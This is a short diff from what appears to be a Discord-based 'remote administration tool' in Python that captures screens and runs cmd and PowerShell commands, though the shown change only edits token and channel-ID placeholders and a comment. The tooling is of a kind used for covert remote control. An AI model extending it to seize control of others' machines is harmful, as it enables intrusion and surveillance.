@@ -18,9 +18,10 @@ from mss import mss
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
 
 # Enter Discord Bot Token & Channel ID:
-BOT_TOKEN = 'Enter Token Here'
+BOT_TOKEN = 'Enter Token here'
+CHANNEL_ID = 'Enter Channel ID here'
 
-#Used by !echo(set) and !cmd/!powershell(get)
+# Used by !echo(set) and !cmd / !powershell(get)
 display_output = True
 
 
